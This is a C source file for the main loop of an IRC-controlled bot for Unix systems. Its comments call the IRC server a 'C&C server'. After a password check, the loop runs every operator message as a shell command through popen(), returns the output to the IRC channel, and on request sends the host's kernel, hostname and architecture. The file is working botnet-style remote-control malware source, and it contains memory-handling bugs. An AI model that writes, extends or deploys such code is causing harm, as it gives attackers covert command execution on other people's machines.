/*	et_main_loop_nix.c
	Author: William Woodruff
	------------------------
	The primary function used by et to send/receive data on *nix.
*/

#include "../cnc_info.h"
#include <string.h>
#include <stdio.h>
#include <sys/utsname.h>
#include <stdbool.h>

/*	et_main_loop_nix
	The main loop called by et_nix.c to communicate with the IRC C&C server.
	arg: int socket, the network socket to write to/read from.
	arg: char *nick, the string containing the IRC nickname
*/
void et_main_loop_nix(int socket, char *nick)
{
	char buf[1024];
	bool auth = false;

	while(1)
	{
		recv(socket, buf, 1023, 0);
		buf[1024] = '\0';

		char *ping;
		if ((ping = strstr(buf, "PING")) && !(strstr(buf, "CASEMAPPING")))
		{
			char *pong = strtok(ping, "\r\n");
			strncpy(pong, "PONG", 4);
			send(socket, pong, strlen(pong), 0);
		}
		else if (strstr(buf, "PRIVMSG") && strstr(buf, nick))
		{
			char *line = strtok(buf, "\r\n");
			char *cmd = strrchr(line, ':');
			cmd++; /* increment past the : */

			if (strstr(cmd, "auth") && !(strstr(cmd, "deauth")))
			{
				cmd += 5; /* increment past 'auth' */
				char auth_message[256];

				if (!strcmp(cmd, IRC_AUTH))
				{
					auth = true;
					snprintf(auth_message, 256, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
					send(socket, auth_message, strlen(auth_message), 0);
				}
				else
				{
					snprintf(auth_message, 256, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
					send(socket, auth_message, strlen(auth_message), 0);
				}
			}
			else
			{
				if (!auth)
				{
					char unauth_message[256];
					snprintf(unauth_message, 256, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
					send(socket, unauth_message, strlen(unauth_message), 0);
				}
				else
				{
					if (!strcmp(cmd, "quit"))
					{
						break; /* back to main@et_nix.c */
					}
					else if (!strcmp(cmd, "deauth"))
					{
						char deauth_message[256];
						snprintf(deauth_message, 256, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
						send(socket, deauth_message, strlen(deauth_message), 0);
						auth = false;
					}
					else if (!strcmp(cmd, "info"))
					{
						struct utsname sys_info;
						uname(&sys_info);

						char sysname[512];
						char nodename[512];
						char release[512];
						char version[512];
						char machine[512];

						snprintf(sysname, 512, "PRIVMSG %s :Kernel: %s\r\n", IRC_CHANNEL, sys_info.sysname);
						send(socket, sysname, strlen(sysname), 0);

						snprintf(nodename, 512, "PRIVMSG %s :Host: %s\r\n", IRC_CHANNEL, sys_info.nodename);
						send(socket, nodename, strlen(nodename), 0);
						
						snprintf(release, 512, "PRIVMSG %s :Release: %s\r\n", IRC_CHANNEL, sys_info.release);
						send(socket, release, strlen(release), 0);

						snprintf(version, 512, "PRIVMSG %s :Version: %s\r\n", IRC_CHANNEL, sys_info.version);
						send(socket, version, strlen(version), 0);

						snprintf(machine, 512, "PRIVMSG %s :Arch: %s\r\n", IRC_CHANNEL, sys_info.machine);
						send(socket, machine, strlen(machine), 0);
					}
					else
					{
						char cmd_output[512];
						char cmd_message[512];

						FILE *output_file = popen(cmd, "r");
						fread((void *) cmd_output, 1, 512, output_file);

						int i;
						for (i = 0; cmd_output[i]; i++)
						{
							if (cmd_output[i] == '\n')
							{
								cmd_output[i] = ' ';
							}
						}

						if (strlen(cmd_output) >= 500)
						{
							snprintf(cmd_message, 512, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
						}
						else
						{
							snprintf(cmd_message, 512, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
						}

						send(socket, cmd_message, strlen(cmd_message), 0);
						pclose(output_file);
						memset(cmd_output, 0, 512);
					}
				}
			}
		}
	}
}
